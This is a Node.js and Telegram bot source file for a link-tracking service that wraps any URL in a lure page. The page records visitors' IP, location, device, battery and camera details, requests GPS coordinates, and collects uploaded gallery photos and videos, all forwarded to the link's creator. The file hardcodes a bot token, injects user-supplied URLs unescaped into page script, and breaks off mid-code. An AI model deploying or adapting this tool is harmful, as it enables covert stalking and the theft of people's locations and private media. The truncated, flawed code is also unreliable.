import express from 'express';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// ========== কনফিগারেশন ==========
const BASE_URL = process.env.BASE_URL || 'https://your-render-url.onrender.com';
const BOT_TOKEN = '8883310302:AAE7E4RXdhErGPJ1om-CLeCeoXSnbbdzQu4';

// ফোল্ডার তৈরি
const uploadsDir = path.join(__dirname, 'uploads');
const publicDir = path.join(__dirname, 'public');

if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });

// JSON ডাটাবেস
let links = {};
let clicks = {};
let userFiles = {};
const dbFile = path.join(__dirname, 'links.json');
const clicksFile = path.join(__dirname, 'clicks.json');
const filesFile = path.join(__dirname, 'userfiles.json');

if (fs.existsSync(dbFile)) {
    try {
        links = JSON.parse(fs.readFileSync(dbFile));
    } catch (e) {
        links = {};
    }
}

if (fs.existsSync(clicksFile)) {
    try {
        clicks = JSON.parse(fs.readFileSync(clicksFile));
    } catch (e) {
        clicks = {};
    }
}

if (fs.existsSync(filesFile)) {
    try {
        userFiles = JSON.parse(fs.readFileSync(filesFile));
    } catch (e) {
        userFiles = {};
    }
}

// Save functions
function saveLinks() {
    fs.writeFileSync(dbFile, JSON.stringify(links, null, 2));
}

function saveClicks() {
    fs.writeFileSync(clicksFile, JSON.stringify(clicks, null, 2));
}

function saveUserFiles() {
    fs.writeFileSync(filesFile, JSON.stringify(userFiles, null, 2));
}

// ========== মিডলওয়্যার ==========
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// ========== টেলিগ্রাম বোট ==========
const { default: TelegramBot } = await import('node-telegram-bot-api');

let bot;

try {
    bot = new TelegramBot(BOT_TOKEN, { 
        polling: true,
        request: { timeout: 60000 }
    });
    
    console.log('🤖 Bot starting...');
    
    bot.getMe().then(botInfo => {
        console.log(`✅ Bot @${botInfo.username} is ready!`);
    }).catch(err => {
        console.log('GetMe error:', err.message);
    });
    
    // ========== স্টার্ট ==========
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        const name = msg.from.first_name || msg.from.username;
        
        bot.sendMessage(chatId, `
🎉 *Hello ${name}!* 🎉

*TNEH Advanced Link Tracker Bot*

🔗 *Features:*
• Track visitor location on Google Maps
• Access visitor gallery (with permission)
• Receive photos & videos from visitors
• Complete visitor analytics

*Commands:*
/start - Welcome
/help - Help
/mylinks - Your links
/stats [id] - Link statistics
/gallery [id] - View visitor gallery files

*Send me a link to track!* 🚀
        `, { parse_mode: 'Markdown' });
    });
    
    // ========== হেল্প ==========
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        
        bot.sendMessage(chatId, `
📖 *Complete Help Guide*

*How it works:*
1️⃣ Send me any URL
2️⃣ Get tracking link
3️⃣ Share link with anyone
4️⃣ When they click:
   • Request gallery permission
   • Get location with Google Maps
   • Capture device info
   • Send photos/videos to you

*Commands:*
/mylinks - Show all your links
/stats [id] - Detailed statistics
/gallery [id] - View files from visitors
/location [id] - Get visitor locations map

*Tracked Information:*
📍 GPS Location + Google Maps Link
📸 Gallery Photos & Videos
📱 Device & Browser Info
🔋 Battery Status
🌐 IP Address

*Send me a link to start!* 🔗
        `, { parse_mode: 'Markdown' });
    });
    
    // ========== মাই লিংকস ==========
    bot.onText(/\/mylinks/, (msg) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        
        const userLinks = Object.values(links).filter(link => link.userId === userId);
        
        if (userLinks.length === 0) {
            return bot.sendMessage(chatId, '❌ No links yet. Send me a URL to create one!');
        }
        
        let message = `📊 *Your Tracking Links (${userLinks.length})*\n\n`;
        userLinks.forEach(link => {
            const totalClicks = (clicks[link.id] || []).length;
            const filesCount = (userFiles[link.id] || []).length;
            message += `🔗 *${link.shortId}*\n`;
            message += `📌 ${BASE_URL}/l/${link.shortId}\n`;
            message += `👁️ Clicks: ${totalClicks}\n`;
            message += `📸 Files: ${filesCount}\n`;
            message += `📅 ${new Date(link.createdAt).toLocaleDateString()}\n\n`;
        });
        
        message += `\nUse /stats [id] for details\n`;
        message += `Use /gallery [id] to see received files`;
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
    
    // ========== গ্যালারি ভিউ ==========
    bot.onText(/\/gallery (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const shortId = match[1];
        
        const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
        
        if (!link) {
            return bot.sendMessage(chatId, '❌ Link not found or not yours!');
        }
        
        const files = userFiles[link.id] || [];
        
        if (files.length === 0) {
            return bot.sendMessage(chatId, '📭 No files received from visitors yet!');
        }
        
        let message = `📸 *Gallery Files Received (${files.length})*\n\n`;
        files.slice(-10).reverse().forEach((file, i) => {
            message += `${i+1}. ${file.type.toUpperCase()} - ${new Date(file.timestamp).toLocaleString()}\n`;
            message += `   👤 From: ${file.visitorInfo?.city || 'Unknown'}, ${file.visitorInfo?.country || 'Unknown'}\n`;
            if (file.caption) message += `   💬 ${file.caption}\n`;
            message += `   🔗 ${BASE_URL}/file/${file.fileId}\n\n`;
        });
        
        message += `\nTotal files: ${files.length}\n`;
        message += `Latest 10 shown. Use /allfiles ${shortId} to see all file links.`;
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
    
    // ========== সব ফাইল দেখান ==========
    bot.onText(/\/allfiles (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const shortId = match[1];
        
        const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
        
        if (!link) {
            return bot.sendMessage(chatId, '❌ Link not found!');
        }
        
        const files = userFiles[link.id] || [];
        
        if (files.length === 0) {
            return bot.sendMessage(chatId, '📭 No files yet!');
        }
        
        // Send as file list
        let message = `📸 *All Gallery Files*\n\n`;
        files.forEach((file, i) => {
            message += `${i+1}. ${BASE_URL}/file/${file.fileId}\n`;
        });
        
        // Split if too long
        if (message.length > 4000) {
            await bot.sendMessage(chatId, `📸 Total ${files.length} files. Use /gallery ${shortId} to see preview.`);
        } else {
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        }
    });
    
    // ========== লোকেশন ম্যাপ দেখান ==========
    bot.onText(/\/location (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const shortId = match[1];
        
        const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
        
        if (!link) {
            return bot.sendMessage(chatId, '❌ Link not found!');
        }
        
        const linkClicks = clicks[link.id] || [];
        const locations = linkClicks.filter(c => c.lat && c.lon);
        
        if (locations.length === 0) {
            return bot.sendMessage(chatId, '📍 No location data available yet!');
        }
        
        // Send latest location with Google Maps
        const latest = locations[locations.length - 1];
        const googleMapsUrl = `https://www.google.com/maps?q=${latest.lat},${latest.lon}`;
        
        await bot.sendLocation(chatId, latest.lat, latest.lon);
        await bot.sendMessage(chatId, `
📍 *Visitor Location*

🗺️ *Google Maps:* ${googleMapsUrl}

📍 *Coordinates:* ${latest.lat}, ${latest.lon}
🏙️ *City:* ${latest.city || 'Unknown'}
🌍 *Country:* ${latest.country || 'Unknown'}
🕐 *Time:* ${new Date(latest.timestamp).toLocaleString()}

Total locations tracked: ${locations.length}
        `, { parse_mode: 'Markdown' });
    });
    
    // ========== স্ট্যাটস ==========
    bot.onText(/\/stats(.+)?/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        let shortId = match[1] ? match[1].trim() : null;
        
        if (!shortId) {
            return bot.sendMessage(chatId, '❌ Please provide link ID. Example: `/stats abc123`', { parse_mode: 'Markdown' });
        }
        
        const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
        
        if (!link) {
            return bot.sendMessage(chatId, '❌ Link not found or not yours!');
        }
        
        const linkClicks = clicks[link.id] || [];
        const filesReceived = userFiles[link.id] || [];
        const totalClicks = linkClicks.length;
        
        // Get unique visitors
        const uniqueIPs = new Set(linkClicks.map(c => c.ip)).size;
        
        // Device stats
        const devices = {};
        const browsers = {};
        const countries = {};
        
        linkClicks.forEach(click => {
            if (click.device) devices[click.device] = (devices[click.device] || 0) + 1;
            if (click.browser) browsers[click.browser] = (browsers[click.browser] || 0) + 1;
            if (click.country) countries[click.country] = (countries[click.country] || 0) + 1;
        });
        
        let message = `📊 *Link Statistics*\n\n`;
        message += `🔗 *Original:* ${link.originalUrl}\n`;
        message += `📌 *Tracking Link:* ${BASE_URL}/l/${link.shortId}\n\n`;
        message += `📈 *Overview:*\n`;
        message += `• Total Clicks: *${totalClicks}*\n`;
        message += `• Unique Visitors: *${uniqueIPs}*\n`;
        message += `• Files Received: *${filesReceived.length}*\n`;
        message += `• Created: ${new Date(link.createdAt).toLocaleString()}\n\n`;
        
        if (Object.keys(devices).length > 0) {
            message += `📱 *Devices:*\n`;
            for (const [device, count] of Object.entries(devices)) {
                const percent = ((count / totalClicks) * 100).toFixed(1);
                message += `• ${device}: ${count} (${percent}%)\n`;
            }
            message += `\n`;
        }
        
        if (Object.keys(browsers).length > 0) {
            message += `🌐 *Browsers:*\n`;
            for (const [browser, count] of Object.entries(browsers)) {
                const percent = ((count / totalClicks) * 100).toFixed(1);
                message += `• ${browser}: ${count} (${percent}%)\n`;
            }
            message += `\n`;
        }
        
        if (Object.keys(countries).length > 0) {
            message += `🌍 *Top Countries:*\n`;
            const topCountries = Object.entries(countries).sort((a,b) => b[1] - a[1]).slice(0, 5);
            for (const [country, count] of topCountries) {
                const percent = ((count / totalClicks) * 100).toFixed(1);
                message += `• ${country}: ${count} (${percent}%)\n`;
            }
            message += `\n`;
        }
        
        message += `\n📸 *Commands:*\n`;
        message += `/gallery ${shortId} - View received files\n`;
        message += `/location ${shortId} - View visitor map\n`;
        message += `/recent ${shortId} - Recent clicks`;
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
    
    // ========== রিসেন্ট ক্লিকস ==========
    bot.onText(/\/recent (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const shortId = match[1];
        
        const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
        
        if (!link) {
            return bot.sendMessage(chatId, '❌ Link not found!');
        }
        
        const linkClicks = clicks[link.id] || [];
        const recentClicks = linkClicks.slice(-10).reverse();
        
        if (recentClicks.length === 0) {
            return bot.sendMessage(chatId, '📭 No clicks yet!');
        }
        
        let message = `🕒 *Recent 10 Clicks*\n\n`;
        recentClicks.forEach((click, i) => {
            message += `${i+1}. ${new Date(click.timestamp).toLocaleString()}\n`;
            message += `   📍 ${click.city || 'Unknown'}, ${click.country || 'Unknown'}\n`;
            message += `   📱 ${click.device || 'Unknown'} | ${click.browser || 'Unknown'}\n`;
            if (click.battery) message += `   🔋 Battery: ${click.battery}%\n`;
            if (click.hasCamera) message += `   📸 Camera: Yes\n`;
            message += `\n`;
        });
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
    
    // ========== লিংক প্রসেস ==========
    bot.onText(/(https?:\/\/[^\s]+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username || msg.from.first_name;
        const originalUrl = match[1];
        
        console.log(`🔗 New link from: ${username}`);
        console.log(`📌 Original: ${originalUrl}`);
        
        try {
            const shortId = crypto.randomBytes(4).toString('hex');
            const linkId = uuidv4();
            
            links[linkId] = {
                id: linkId,
                shortId: shortId,
                originalUrl: originalUrl,
                userId: userId,
                username: username,
                createdAt: new Date().toISOString()
            };
            
            saveLinks();
            
            const trackingUrl = `${BASE_URL}/l/${shortId}`;
            
            await bot.sendMessage(chatId, `
✅ *Advanced Tracking Link Created!*

🔗 *Your Tracking Link:*
${trackingUrl}

📌 *Original URL:*
${originalUrl}

📊 *What you can track:*
• 📍 Live location with Google Maps
• 📸 Gallery photos & videos (with permission)
• 📱 Complete device information
• 🔋 Battery status
• 🌐 IP & Location data
• 🎯 Real-time analytics

👁️ *Commands to use:*
/mylinks - View all links
/stats ${shortId} - Statistics
/gallery ${shortId} - Received files
/location ${shortId} - Visitor map

Share this link and get complete visitor intelligence! 🚀
            `, { parse_mode: 'Markdown', disable_web_page_preview: true });
            
            console.log(`✅ Tracking link created: ${trackingUrl}`);
            
        } catch (error) {
            console.error('Link creation error:', error);
            await bot.sendMessage(chatId, '❌ Failed to create tracking link. Please try again.');
        }
    });
    
    // ========== ফাইল রিকোয়েস্ট হ্যান্ডেল ==========
    bot.on('callback_query', async (callbackQuery) => {
        const message = callbackQuery.message;
        const chatId = message.chat.id;
        const data = callbackQuery.data;
        
        if (data.startsWith('allow_gallery_')) {
            const shortId = data.replace('allow_gallery_', '');
            
            await bot.answerCallbackQuery(callbackQuery.id);
            await bot.sendMessage(chatId, `
✅ *Gallery Access Granted!*

You can now:
• Share photos from your gallery
• Share videos
• Send any media files

Simply use the buttons below or send files directly!

Use /done when finished sharing.
            `, { parse_mode: 'Markdown' });
        }
        
        await bot.answerCallbackQuery(callbackQuery.id);
    });
    
    console.log('✅ Bot is ready! Send any link to start tracking.');
    
} catch (error) {
    console.error('Bot error:', error.message);
}

// ========== ট্র্যাকিং লিংক ==========
app.get('/l/:shortId', async (req, res) => {
    const { shortId } = req.params;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    
    if (!link) {
        return res.status(404).send('Link not found');
    }
    
    // Collect visitor information
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const acceptLanguage = req.headers['accept-language'];
    
    // Parse user agent
    let device = 'Unknown';
    let browser = 'Unknown';
    let os = 'Unknown';
    
    if (userAgent) {
        if (userAgent.includes('Mobile')) device = 'Mobile';
        else if (userAgent.includes('Tablet')) device = 'Tablet';
        else device = 'Desktop';
        
        if (userAgent.includes('Chrome')) browser = 'Chrome';
        else if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Safari')) browser = 'Safari';
        else if (userAgent.includes('Edge')) browser = 'Edge';
        
        if (userAgent.includes('Windows')) os = 'Windows';
        else if (userAgent.includes('Mac')) os = 'MacOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iOS')) os = 'iOS';
    }
    
    // Get location
    let location = { country: 'Unknown', city: 'Unknown', lat: null, lon: null };
    try {
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon`);
        const geoData = await geoResponse.json();
        if (geoData.status === 'success') {
            location.country = geoData.country;
            location.city = geoData.city;
            location.lat = geoData.lat;
            location.lon = geoData.lon;
        }
    } catch (e) {
        console.log('Geo lookup failed:', e.message);
    }
    
    // Save click data
    const clickData = {
        id: uuidv4(),
        linkId: link.id,
        timestamp: new Date().toISOString(),
        ip: ip,
        userAgent: userAgent,
        device: device,
        browser: browser,
        os: os,
        country: location.country,
        city: location.city,
        lat: location.lat,
        lon: location.lon,
        language: acceptLanguage,
        battery: null,
        hasCamera: null,
        screenWidth: null,
        screenHeight: null
    };
    
    if (!clicks[link.id]) clicks[link.id] = [];
    clicks[link.id].push(clickData);
    saveClicks();
    
    // Send tracking page with gallery access
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Access Request - ${link.shortId}</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    padding: 20px;
                }
                .container {
                    max-width: 500px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 20px;
                    padding: 30px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                h1 { color: #333; margin-bottom: 20px; text-align: center; }
                .info {
                    background: #f0fdf4;
                    border: 1px solid #86efac;
                    border-radius: 10px;
                    padding: 15px;
                    margin: 20px 0;
                }
                button {
                    width: 100%;
                    padding: 15px;
                    margin: 10px 0;
                    border: none;
                    border-radius: 10px;
                    font-size: 16px;
                    cursor: pointer;
                    transition: transform 0.2s;
                }
                button:active { transform: scale(0.98); }
                .allow-btn {
                    background: #10b981;
                    color: white;
                }
                .deny-btn {
                    background: #ef4444;
                    color: white;
                }
                .upload-area {
                    display: none;
                    margin-top: 20px;
                    padding: 20px;
                    border: 2px dashed #ccc;
                    border-radius: 10px;
                    text-align: center;
                }
                .file-input {
                    display: none;
                }
                .upload-label {
                    background: #667eea;
                    color: white;
                    padding: 10px 20px;
                    border-radius: 8px;
                    cursor: pointer;
                    display: inline-block;
                }
                #preview {
                    margin-top: 10px;
                    display: flex;
                    flex-wrap: wrap;
                    gap: 10px;
                }
                .preview-item {
                    position: relative;
                    width: 100px;
                    height: 100px;
                }
                .preview-item img, .preview-item video {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    border-radius: 8px;
                }
                .remove-btn {
                    position: absolute;
                    top: -5px;
                    right: -5px;
                    background: red;
                    color: white;
                    border-radius: 50%;
                    width: 20px;
                    height: 20px;
                    text-align: center;
                    line-height: 20px;
                    cursor: pointer;
                    font-size: 12px;
                }
                .send-btn {
                    background: #667eea;
                    color: white;
                    margin-top: 10px;
                }
                .status {
                    margin-top: 10px;
                    padding: 10px;
                    border-radius: 8px;
                    text-align: center;
                }
                .loading {
                    display: none;
                    text-align: center;
                    margin-top: 10px;
                }
                .spinner {
                    border: 3px solid #f3f3f3;
                    border-top: 3px solid #667eea;
                    border-radius: 50%;
                    width: 30px;
                    height: 30px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .location-btn {
                    background: #3b82f6;
                    color: white;
                    margin-top: 10px;
                }
                .map-link {
                    display: block;
                    text-align: center;
                    margin-top: 10px;
                    color: #3b82f6;
                    text-decoration: none;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔐 Access Request</h1>
                <p style="text-align: center; color: #666;">This website wants to access:</p>
                <div class="info">
                    <p>✅ 📍 Your location (to show on Google Maps)</p>
                    <p>✅ 📸 Your gallery photos & videos</p>
                    <p>✅ 📱 Device information</p>
                    <p>✅ 🔋 Battery status</p>
                </div>
                
                <button class="allow-btn" onclick="allowAccess()">✅ Allow & Continue</button>
                <button class="deny-btn" onclick="denyAccess()">❌ Deny & Continue</button>
                
                <div id="uploadArea" class="upload-area">
                    <h3>📸 Share Files (Optional)</h3>
                    <p>You can share photos or videos with the link owner</p>
                    
                    <label class="upload-label" for="fileInput">📁 Select Files</label>
                    <input type="file" id="fileInput" class="file-input" multiple accept="image/*,video/*">
                    
                    <div id="preview"></div>
                    
                    <button id="sendBtn" class="send-btn" onclick="sendFiles()" style="display:none">📤 Send to Owner</button>
                    <button class="location-btn" onclick="shareLocation()">📍 Share My Location</button>
                    
                    <div id="uploadStatus" class="status"></div>
                    <div id="loadingSpinner" class="loading">
                        <div class="spinner"></div>
                        <p>Uploading...</p>
                    </div>
                </div>
                
                <div id="redirectMessage" style="text-align: center; margin-top: 20px; display: none;">
                    <p>⏳ Redirecting to destination...</p>
                </div>
            </div>
            
            <script>
                let selectedFiles = [];
                let shortId = '${shortId}';
                let locationShared = false;
                
                // Capture device info
                if ('getBattery' in navigator) {
                    navigator.getBattery().then(function(battery) {
                        fetch('/api/track/${shortId}/battery', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                level: battery.level * 100,
                                charging: battery.charging
                            })
                        }).catch(e => console.log('Battery tracking failed'));
                    });
                }
                
                // Capture screen info
                fetch('/api/track/${shortId}/screen', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    })
                }).catch(e => console.log('Screen tracking failed'));
                
                function allowAccess() {
                    document.querySelector('.allow-btn').style.display = 'none';
                    document.querySelector('.deny-btn').style.display = 'none';
                    document.getElementById('uploadArea').style.display = 'block';
                    
                    // Check for camera/gallery
                    if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                        navigator.mediaDevices.enumerateDevices().then(devices => {
                            const hasCamera = devices.some(device => device.kind === 'videoinput');
                            fetch('/api/track/${shortId}/devices', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ hasCamera: hasCamera })
                            }).catch(e => console.log('Device tracking failed'));
                        });
                    }
                    
                    // Get location
                    getLocation();
                    
                    // Notify bot
                    fetch('/api/track/${shortId}/access', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ granted: true })
                    });
                }
                
                function denyAccess() {
                    document.querySelector('.allow-btn').style.display = 'none';
                    document.querySelector('.deny-btn').style.display = 'none';
                    document.getElementById('redirectMessage').style.display = 'block';
                    
                    fetch('/api/track/${shortId}/access', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ granted: false })
                    });
                    
                    setTimeout(() => {
                        window.location.href = '${link.originalUrl}';
                    }, 2000);
                }
                
                function getLocation() {
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            
                            fetch('/api/track/${shortId}/location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ lat: lat, lon: lon })
                            });
                        });
                    }
                }
                
                function shareLocation() {
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const mapsUrl = `https://www.google.com/maps?q=\${lat},\${lon}`;
                            
                            fetch('/api/track/${shortId}/location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ lat: lat, lon: lon, shared: true })
                            });
                            
                            document.getElementById('uploadStatus').innerHTML = \`
                                <div style="background:#d1fae5;padding:10px;border-radius:8px">
                                    ✅ Location shared! <a href="\${mapsUrl}" target="_blank">View on Google Maps</a>
                                </div>
                            \`;
                            locationShared = true;
                        });
                    } else {
                        alert('Geolocation not supported');
                    }
                }
                
                // File selection
                document.getElementById('fileInput').addEventListener('change', function(e) {
                    selectedFiles = Array.from(e.target.files);
                    const previewDiv = document.getElementById('preview');
                    previewDiv.innerHTML = '';
                    
                    selectedFiles.forEach((file, index) => {
                        const reader = new FileReader();
                        reader.onload = function(event) {
                            const previewItem = document.createElement('div');
                            previewItem.className = 'preview-item';
                            
                            if (file.type.startsWith('image/')) {
                                const img = document.createElement('img');
                                img.src = event.target.result;
                                previewItem.appendChild(img);
                            } else if (file.type.startsWith('video/')) {
                                const video = document.createElement('video');
                                video.src = event.target.result;
                                video.muted = true;
                                previewItem.appendChild(video);
                            }
                            
                            const removeBtn = document.createElement('div');
                            removeBtn.className = 'remove-btn';
                            removeBtn.innerHTML = '×';
                            removeBtn.onclick = () => {
                                selectedFiles.splice(index, 1);
                                previewItem.remove();
                                if (selectedFiles.length === 0) {
                                    document.getElementById('sendBtn').style.display = 'none';
                                }
                            };
                            previewItem.appendChild(removeBtn);
                            previewDiv.appendChild(previewItem);
                        };
                        reader.readAsDataURL(file);
                    });
                    
                    document.getElementById('sendBtn').style.display = selectedFiles.length > 0 ? 'block' : 'none';
                });
                
                async function sendFiles() {
                    if (selectedFiles.length === 0) return;
                    
                    const statusDiv = document.getElementById('uploadStatus');
                    const loadingDiv = document.getElementById('loadingSpinner');
                    
                    loadingDiv.style.display = 'block';
                    statusDiv.innerHTML = '';
                    
                    for (const file of selectedFiles) {
                        const formData = new FormData();
                        formData.append('file', file);
                        formData.append('shortId', shortId);
                        
                        try {
                            const response = await fetch('/api/upload/file', {
                                method: 'POST',
                                body: formData
                            });
                            
                            const data = await response.json();
                            if (data.success) {
                                statusDiv.innerHTML += \`<div style="background:#d1fae5;padding:5px;margin:5px;border-radius:5px">✅ \${file.name} uploaded</div>\`;
                            }
                        } catch (error) {
                            statusDiv.innerHTML += \`<div style="background:#fee2e2;padding:5px;margin:5px;border-radius:5px">❌ Failed: \${file.name}</div>\`;
                        }
                    }
                    
                    loadingDiv.style.display = 'none';
                    selectedFiles = [];
                    document.getElementById('preview').innerHTML = '';
                    document.getElementById('sendBtn').style.display = 'none';
                    document.getElementById('fileInput').value = '';
                    
                    setTimeout(() => {
                        document.getElementById('redirectMessage').style.display = 'block';
                        window.location.href = '${link.originalUrl}';
                    }, 3000);
                }
            </script>
        </body>
        </html>
    `);
});

// ========== API Endpoints for tracking ==========
app.post('/api/track/:shortId/battery', async (req, res) => {
    const { shortId } = req.params;
    const { level, charging } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id]) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.battery = level;
            lastClick.batteryCharging = charging;
            saveClicks();
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/screen', async (req, res) => {
    const { shortId } = req.params;
    const { width, height, colorDepth, pixelRatio } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id]) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.screenWidth = width;
            lastClick.screenHeight = height;
            lastClick.colorDepth = colorDepth;
            lastClick.pixelRatio = pixelRatio;
            saveClicks();
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/devices', async (req, res) => {
    const { shortId } = req.params;
    const { hasCamera } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id]) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.hasCamera = hasCamera;
            saveClicks();
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/location', async (req, res) => {
    const { shortId } = req.params;
    const { lat, lon, shared } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id]) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.gpsLat = lat;
            lastClick.gpsLon = lon;
            lastClick.locationShared = shared || false;
            saveClicks();
            
            // Send location to bot owner
            if (bot && link.userId) {
                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                await bot.sendLocation(link.userId, lat, lon);
                await bot.sendMessage(link.userId, `
📍 *New Location Shared!*

🔗 *Link:* ${BASE_URL}/l/${shortId}
🗺️ *Google Maps:* ${googleMapsUrl}
📍 *Coordinates:* ${lat}, ${lon}
👤 *From:* ${lastClick.city || 'Unknown'}, ${lastClick.country || 'Unknown'}
🕐 *Time:* ${new Date().toLocaleString()}
                `, { parse_mode: 'Markdown' });
            }
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/access', async (req, res) => {
    const { shortId } = req.params;
    const { granted } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && bot && link.userId) {
        await bot.sendMessage(link.userId, `
🔐 *Gallery Access Update!*

🔗 *Link:* ${BASE_URL}/l/${shortId}
✅ *Access Granted:* ${granted ? 'YES' : 'NO'}
👤 *Visitor:* ${link.originalUrl}
🕐 *Time:* ${new Date().toLocaleString()}

${granted ? '📸 Visitor can now share photos and videos!' : '❌ Visitor denied gallery access'}
        `, { parse_mode: 'Markdown' });
    }
    res.json({ success: true });
});

// ========== File Upload API ==========
app.post('/api/upload/file', upload.single('file'), async (req, res) => {
    try {
        const { shortId } = req.body;
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const link = Object.values(links).find(l => l.shortId === shortId);
        
        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }
        
        const fileId = uuidv4();
        const ext = path.extname(req.file.originalname);
        const filename = `${fileId}${ext}`;
        const filepath = path.join(uploadsDir, filename);
        
        // Save file
        fs.writeFileSync(filepath, req.file.buffer);
        
        // Get visitor info from last click
        const lastClick = clicks[link.id] ? clicks[link.id][clicks[link.id].length - 1] : null;
        
        // Save to user files
        const fileData = {
            fileId: fileId,
            filename: req.file.originalname,
            type: req.file.mimetype.startsWith('image/') ? 'image' : 'video',
            size: req.file.size,
            timestamp: new Date().toISOString(),
            visitorInfo: {
                city: lastClick?.city || 'Unknown',
                country: lastClick?.country || 'Unknown',
                device: lastClick?.device || 'Unknown'
            }
        };
        
        if (!userFiles[link.id]) userFiles[link.id] = [];
        userFiles[link.id].push(fileData);
        saveUserFiles();
        
        // Send to bot owner
        if (bot && link.userId) {
            const caption = `
📸 *New File Received!*

🔗 *From Link:* ${BASE_URL}/l/${shortId}
📁 *File:* ${req.file.originalname}
📊 *Size:* ${(req.file.size / 1024).toFixed(2)} KB
📍 *Location:* ${lastClick?.city || 'Unknown'}, ${lastClick?.country || 'Unknown'}
🕐 *Time:* ${new Date().toLocaleString()}

